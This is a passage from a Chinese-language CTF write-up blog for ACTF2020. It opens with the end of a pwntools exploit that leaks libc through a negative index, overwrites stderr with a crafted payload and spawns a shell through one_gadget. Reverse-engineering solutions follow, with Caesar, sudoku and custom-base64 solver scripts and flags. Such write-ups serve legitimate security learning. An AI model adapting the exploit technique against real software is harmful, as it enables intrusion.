class="title">mod</span><span class="params">(index, cont)</span>:</span></span><br><span class="line">    sla(<span class="string">'Your choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">'The complaint index you want to modify:\n'</span>,str(index))</span><br><span class="line">    sla(<span class="string">'Input your complaint:'</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">'Your choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">    sla(<span class="string">'The complaint index you want to show:\n'</span>,str(index))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">-16</span>)</span><br><span class="line">data = rc()</span><br><span class="line">stderr = uu64(data[<span class="number">448</span>+<span class="number">17</span>:<span class="number">448</span>+<span class="number">6</span>+<span class="number">17</span>])</span><br><span class="line">libc_base = stderr - libc.sym[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">info_addr(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> is_local:</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x106ef8</span></span><br><span class="line"><span class="keyword">if</span> is_remote:</span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf66f0</span></span><br><span class="line">    <span class="comment">#  0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])</span></span><br><span class="line">    <span class="comment">#constraints:</span></span><br><span class="line">    <span class="comment">#  [rcx] == NULL || rcx == NULL</span></span><br><span class="line">    <span class="comment">#  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> is_local:</span><br><span class="line">    payload = p64(stderr)*<span class="number">44</span>+p64(stderr+<span class="number">7936</span>)+p64(stderr)*<span class="number">7</span>+p64(<span class="number">0xffffffff</span>)+p64(stderr+<span class="number">0x1000</span>)*<span class="number">400</span>+p64(one_gadget)*<span class="number">100</span></span><br><span class="line">    <span class="comment">#                                  1                           -1          cmp rax,rcx               func</span></span><br><span class="line"><span class="keyword">if</span> is_remote:</span><br><span class="line">    payload = p64(stderr)*<span class="number">7</span>+p64(one_gadget)+p64(stderr)*<span class="number">10</span>+p64(stderr+<span class="number">4672</span>)+p64(stderr)*<span class="number">6</span>+p64(<span class="number">0xffffffff</span>)+p64(stderr)*<span class="number">31</span>+p64(stderr+<span class="number">8</span>)+p64(<span class="number">0</span>)*<span class="number">200</span></span><br><span class="line">    <span class="comment">#                             func                               1                            -1                           rbp</span></span><br><span class="line">mod(<span class="number">-16</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><p>re题目都比较有意思，不过还是剩了两道题没做，有一到题pwn和re的结合体，然鹅并没有看懂出题人什么意思…还有一道TEA加密，唉，一看到密码就脑壳疼，果断放弃…</p>
<h2 id="Here-you-are"><a href="#Here-you-are" class="headerlink" title="Here_you_are"></a>Here_you_are</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>This is your flag. Here you are.<br>IDA and OD are really my friends. Do you want to play with them too?</p>
</blockquote>
</li>
<li><p>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/Here_you_are/Sign_up.exe" target="_blank" rel="noopener">Sign_up.exe</a></p>
</li>
<li><p>考察点：没有</p>
</li>
<li><p>难度：入门</p>
</li>
<li><p>分值：100</p>
</li>
<li><p>完成人数：10</p>
</li>
</ul>
<p>直接找字符串就行:) </p>
<blockquote>
<p>IDA and OD are really my friends, but I just want to play with radare2.</p>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">19:42 taqini@q /home/taqini/Downloads/actf/re/sign</span><br><span class="line"><span class="meta">%</span><span class="bash"> rabin2 -zz Sign_up.exe | grep &#123;</span></span><br><span class="line">61  0x00001426 0x00403026 6   7    .rdata        ascii   %s&#123;...</span><br><span class="line">62  0x0000142d 0x0040302d 24  25   .rdata        ascii   ACTF&#123;Reverse_w3lcome_:)&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h2><ul>
<li>题目描述：Julius</li>
<li>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/rome/rome.exe" target="_blank" rel="noopener">rome.exe</a></li>
<li>考察点：逆向分析</li>
<li>难度：简单</li>
<li>分值：100</li>
<li>完成人数：6</li>
</ul>
<p>凯撒加密+大小写互换，主要代码如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )&#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;v1 + i) &gt; <span class="string">'@'</span> &amp;&amp; *(&amp;v1 + i) &lt;= <span class="string">'Z'</span> )</span><br><span class="line">        *(&amp;v1 + i) = (*(&amp;v1 + i) - <span class="string">'3'</span>) % <span class="number">26</span> + <span class="string">'A'</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;v1 + i) &gt; <span class="string">'`'</span> &amp;&amp; *(&amp;v1 + i) &lt;= <span class="string">'z'</span> )</span><br><span class="line">        *(&amp;v1 + i) = (*(&amp;v1 + i) - <span class="string">'O'</span>) % <span class="number">26</span> + <span class="string">'a'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )&#123;</span><br><span class="line">	result = *(&amp;v15 + i);</span><br><span class="line">	<span class="keyword">if</span> ( *(&amp;v1 + i) != result )</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">result = <span class="built_in">printf</span>(<span class="string">"You are correct!"</span>);</span><br></pre></td></tr></table></figure></div>

<p>解密(懒得推算了，反正凯撒后的字母是一对一映射的，直接搞到映射表反解即可)：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string <span class="keyword">as</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(ss)</span>:</span></span><br><span class="line">	ll = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> ss:         </span><br><span class="line">		<span class="keyword">if</span> i <span class="keyword">in</span> s.ascii_lowercase:</span><br><span class="line">			ll.append(chr((ord(i)-ord(<span class="string">'O'</span>))%<span class="number">26</span>+ord(<span class="string">'a'</span>)))</span><br><span class="line">		<span class="keyword">elif</span> i <span class="keyword">in</span> s.ascii_uppercase:</span><br><span class="line">			ll.append(chr((ord(i)-ord(<span class="string">'3'</span>))%<span class="number">26</span>+ord(<span class="string">'A'</span>)))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			ll.append(i)</span><br><span class="line">	<span class="keyword">return</span> ll</span><br><span class="line">ans = <span class="string">'Qsw3sj_lz4_Ujw@l'</span></span><br><span class="line">d=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.ascii_uppercase:</span><br><span class="line">	d[enc(i)[<span class="number">0</span>]]=i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.ascii_lowercase:</span><br><span class="line">	d[enc(i)[<span class="number">0</span>]]=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">	<span class="keyword">if</span> i <span class="keyword">in</span> d:</span><br><span class="line">		flag += d[i]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		flag += i</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># Cae3ar_th4_Gre@t</span></span><br></pre></td></tr></table></figure></div>



<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><ul>
<li>题目描述：打比赛打累了吧？来玩个小游戏？</li>
<li>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/game/game.exe" target="_blank" rel="noopener">game.exe</a></li>
<li>考察点：逆向分析，<del>数独游戏技能</del></li>
<li>难度：简单</li>
<li>分值：100</li>
<li>完成人数：5</li>
</ul>
<p>数独游戏，主要代码如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abc_to_num(user_input);</span><br><span class="line">fill_map(user_input, &amp;<span class="built_in">map</span>);</span><br><span class="line">check_map(&amp;<span class="built_in">map</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Congratulations, you successfully solved this little problem!"</span>);</span><br><span class="line"><span class="built_in">printf</span>(aFlag, buf);</span><br></pre></td></tr></table></figure></div>

<p>流程大概是将输入的<code>abcdefghi</code>转成数字<code>123456789</code>，然后按顺序填到棋盘中，最后分别检查每行、每列、每个九宫格内的数字是否合法。</p>
<p>这题只要分析出是数独游戏就好办了，<code>fill_map</code>这个函数中有个循环跑了81次，<code>check_map</code>函数中又有<code>9x9</code>的循环，由此可以想到这是个<code>9x9</code>的二维数组，到这里差不多就知道是数独了，dump出棋盘，玩儿一局数独就能拿到flag，美滋滋~</p>
<p>棋盘：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> <span class="number">5</span> <span class="number">0</span> <span class="number">1</span> <span class="number">4</span> <span class="number">0</span> <span class="number">6</span> <span class="number">8</span> <span class="number">9</span> </span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">8</span> <span class="number">9</span> <span class="number">0</span> <span class="number">6</span> <span class="number">2</span> <span class="number">0</span> <span class="number">5</span> </span><br><span class="line"><span class="number">6</span> <span class="number">7</span> <span class="number">9</span> <span class="number">2</span> <span class="number">5</span> <span class="number">8</span> <span class="number">1</span> <span class="number">4</span> <span class="number">3</span> </span><br><span class="line"><span class="number">3</span> <span class="number">1</span> <span class="number">2</span> <span class="number">5</span> <span class="number">8</span> <span class="number">4</span> <span class="number">7</span> <span class="number">0</span> <span class="number">0</span> </span><br><span class="line"><span class="number">0</span> <span class="number">8</span> <span class="number">0</span> <span class="number">7</span> <span class="number">9</span> <span class="number">0</span> <span class="number">5</span> <span class="number">3</span> <span class="number">2</span> </span><br><span class="line"><span class="number">5</span> <span class="number">9</span> <span class="number">7</span> <span class="number">0</span> <span class="number">6</span> <span class="number">2</span> <span class="number">8</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7</span> <span class="number">2</span> <span class="number">4</span> <span class="number">0</span> <span class="number">1</span> <span class="number">3</span> <span class="number">0</span> <span class="number">5</span> <span class="number">8</span> </span><br><span class="line"><span class="number">8</span> <span class="number">6</span> <span class="number">5</span> <span class="number">4</span> <span class="number">7</span> <span class="number">9</span> <span class="number">3</span> <span class="number">0</span> <span class="number">1</span> </span><br><span class="line"><span class="number">9</span> <span class="number">3</span> <span class="number">1</span> <span class="number">8</span> <span class="number">2</span> <span class="number">5</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p>脚本：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">codemap_s = <span class="string">'2 5 0 1 4 0 6 8 9 0 0 8 9 0 6 2 0 5 6 7 9 2 5 8 1 4 3 3 1 2 5 8 4 7 0 0 0 8 0 7 9 0 5 3 2 5 9 7 0 6 2 8 1 0 7 2 4 0 1 3 0 5 8 8 6 5 4 7 9 3 0 1 9 3 1 8 2 5 4 0 0'</span></span><br><span class="line">codemap = codemap_s.split()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    cnt = <span class="number">0</span> </span><br><span class="line">    cnt0 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> codemap:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">'0'</span>:</span><br><span class="line">            cnt0 += <span class="number">1</span></span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> i,</span><br><span class="line">        <span class="keyword">if</span> cnt %<span class="number">9</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'count of 0: %s'</span>%cnt0</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">user = [<span class="number">3</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> user</span><br><span class="line"></span><br><span class="line">new_map = []</span><br><span class="line"></span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> codemap:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">'0'</span> <span class="keyword">and</span> pos &lt; len(user):</span><br><span class="line">        new_map.append(str(user[pos]))</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_map.append(i)</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> user:</span><br><span class="line">    flag.append(chr(i+<span class="number">96</span>))</span><br><span class="line"></span><br><span class="line">codemap = new_map</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%<span class="string">''</span>.join(flag)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>p.s.数独真好玩儿</p>
</blockquote>
<h2 id="usualCrypt"><a href="#usualCrypt" class="headerlink" title="usualCrypt"></a>usualCrypt</h2><ul>
<li>题目描述：这个加密真的很常见，不信你看看</li>
<li>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/usualCrypt/base.exe" target="_blank" rel="noopener">base.exe</a></li>
<li>考察点：逆向分析</li>
<li>难度：简单</li>
<li>分值：100</li>
<li>完成人数：3</li>
</ul>
<p>输入字符串，经过自定义的<code>base64</code>加密后，与密文比对，解密密文即flag</p>
<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>首先是<code>base64</code>换表</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">swap_Base_table</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> tmp; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">    tmp = array_2[result];</span><br><span class="line">    array_2[result] = array_1[result];</span><br><span class="line">    array_1[result++] = tmp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( result &lt; <span class="number">15</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>原表：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/<br>新表：ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/</p>
</blockquote>
<p>然后就是正常的<code>base64</code>加密</p>
<p>最后还有个密文大小写互换</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">swap_Upper_Lower</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> chr; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(buf) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">      chr = buf[HIDWORD(i)];</span><br><span class="line">      <span class="keyword">if</span> ( chr &lt; <span class="number">97</span> || chr &gt; <span class="number">122</span> )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( chr &lt; <span class="number">65</span> || chr &gt; <span class="number">90</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        LOBYTE(i) = chr + <span class="number">0x20</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        LOBYTE(i) = chr - <span class="number">0x20</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      buf[HIDWORD(i)] = i;</span><br><span class="line">LABEL_9:</span><br><span class="line">      LODWORD(i) = <span class="number">0</span>;</span><br><span class="line">      ++HIDWORD(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( HIDWORD(i) &lt; <span class="built_in">strlen</span>(buf) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>解密就照着加密步骤反过来操作就好</p>
<p>首先，生成<code>base64</code>编码表</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> <span class="built_in">array</span>[] = <span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2B\x2F\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *array_1 = <span class="built_in">array</span>;</span><br><span class="line"><span class="keyword">char</span> *array_2 = <span class="built_in">array</span>+<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">swap</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">    v1 = array_2[result];</span><br><span class="line">    array_2[result] = array_1[result];</span><br><span class="line">    array_1[result++] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( result &lt; <span class="number">15</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="built_in">array</span>);</span><br><span class="line">    <span class="comment">//printf("%s\n",array_1);</span></span><br><span class="line">    <span class="comment">//printf("%s\n",array_2);</span></span><br><span class="line">    swap();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="built_in">array</span>);</span><br><span class="line">    <span class="comment">//printf("%s\n",array_1);</span></span><br><span class="line">    <span class="comment">//printf("%s\n",array_2);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后是密文大小写互换</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">enced = [<span class="number">0x7A</span>, <span class="number">0x4D</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x67</span>, <span class="number">0x6E</span>, <span class="number">0x78</span>, <span class="number">0x4C</span>, <span class="number">0x78</span>, <span class="number">0x4A</span>, <span class="number">0x68</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x64</span>, <span class="number">0x74</span>, <span class="number">0x5A</span>, <span class="number">0x6E</span>, <span class="number">0x32</span>, <span class="number">0x66</span>, <span class="number">0x46</span>, <span class="number">0x6B</span>, <span class="number">0x33</span>, <span class="number">0x6C</span>, <span class="number">0x59</span>, <span class="number">0x43</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x50</span>, <span class="number">0x43</span>, <span class="number">0x32</span>, <span class="number">0x6C</span>, <span class="number">0x39</span>]</span><br><span class="line">chipertext = <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> enced])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> chipertext</span><br><span class="line"></span><br><span class="line"><span class="comment"># swap uppercase and lowercase</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swapUL</span><span class="params">(buf)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> buf:</span><br><span class="line">        c = ord(i)</span><br><span class="line">        <span class="keyword">if</span> c &lt; <span class="number">97</span> <span class="keyword">or</span> c &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> c &lt; <span class="number">65</span> <span class="keyword">or</span> c &gt; <span class="number">90</span>:</span><br><span class="line">                tmp += i</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            tmp += chr(c+<span class="number">0x20</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp += chr(c<span class="number">-0x20</span>)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">newc = swapUL(chipertext)</span><br><span class="line"><span class="keyword">print</span> newc</span><br></pre></td></tr></table></figure></div>

<p>最后进行<code>base64</code>解密</p>
